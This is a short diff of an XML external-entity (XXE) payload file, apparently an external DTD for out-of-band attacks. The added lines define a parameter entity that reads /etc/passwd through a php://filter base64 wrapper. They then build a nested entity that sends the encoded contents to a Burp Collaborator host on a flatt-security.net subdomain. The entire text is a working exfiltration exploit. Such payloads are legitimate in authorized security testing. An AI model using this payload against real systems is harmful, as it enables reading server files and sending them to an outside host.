@@ -1,3 +1,2 @@
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://5u0axw3kvflmomm03j3ehakj2a85wvkk.burpcollaborator.flatt-security.net/%start;%r;%end;'>">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://5u0axw3kvflmomm03j3ehakj2a85wvkk.burpcollaborator.flatt-security.net/%data;'>">
